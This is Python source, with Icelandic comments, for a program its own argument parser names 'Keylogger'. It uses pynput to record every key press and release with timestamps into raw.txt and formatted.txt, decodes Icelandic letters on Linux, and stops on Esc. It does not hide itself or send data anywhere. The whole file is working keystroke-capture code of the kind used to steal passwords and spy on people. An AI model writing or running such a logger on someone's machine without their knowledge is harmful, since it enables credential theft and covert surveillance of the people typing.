#coding:utf-8
from pynput.keyboard import Key, Listener
from timemanager import timemanager
import argparse

def on_press(key):
    """Bregst við því að ýtt sé á takka á lyklaborði og skráir það"""
    val = str(key)#Strenggildi takkans sem ýtt er á
    
    #Skráir hrátt úttak ef við á
    if args.raw: raw.write(val + ' Pressed ' + tMan.getTimeStamp() + '\n')
    if args.prnt: print(val)
    
    if args.format:#Skráir formattað útak ef við á
        if tMan.checkTime():#Skráir nýjan tímastimpil ef meira en 10 sekúndur eru síðan ýtt var síðast á takka
            form.write('\n' + tMan.getTimeStamp() + ':\n')
        
        if type(key) == Key:#Takkar sem eru ekki stafir/tákn
            if key == Key.space:
                form.write(' ')
            elif key != Key.shift and key != Key.shift_r:
                form.write('<' + val[4:] + '>\n')
        else:#Stafir/tákn
            if val[-4:-1] in isl:
                form.write(isl[val[-4:-1]])
            else:
                form.write(val[-2])

def on_release(key):
    """Bregst við því að takka sé sleppt"""
    val = str(key)
    
    if args.raw: raw.write(val + ' Released ' + tMan.getTimeStamp() + '\n')
    if args.prnt: print(val + ' Released')
    
    if args.format and (key == Key.ctrl or key == Key.ctrl_r or key == Key.alt or key == Key.cmd):
        form.write('</' + val[4:] + '>')
    
    #Notað við prófun, esc stoppar forritið
    if key == Key.esc: return False

parser = argparse.ArgumentParser('Keylogger')
parser.add_argument('-r', '--raw', help='Write raw output to raw.txt', action='store_true')
parser.add_argument('-f', '--format', help='Write formatted output to formatted.txt', action='store_true')
parser.add_argument('-p', '--prnt', help='Write raw output to stdout', action='store_true')
args = parser.parse_args()

tMan = timemanager()#Klasi sem heldur utan um tíma

#Úttaksskrár
if args.raw: raw = open('raw.txt', 'a')
if args.format:
    form = open('formatted.txt', 'a')
    form.write(tMan.getTimeStamp() + ':\n')

isl = {#Afkóðar íslenska stafi á linux
    'xf0' : 'ð',
    'xd0' : 'Ð',
    'xfe' : 'þ',
    'xde' : 'Þ',
    'xe6' : 'æ',
    'xc6' : 'Æ',
    'xf6' : 'ö',
    'xd6' : 'Ö'
}

with Listener(#Hlustari sem hlustar eftir innslætti á lyklaborð
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
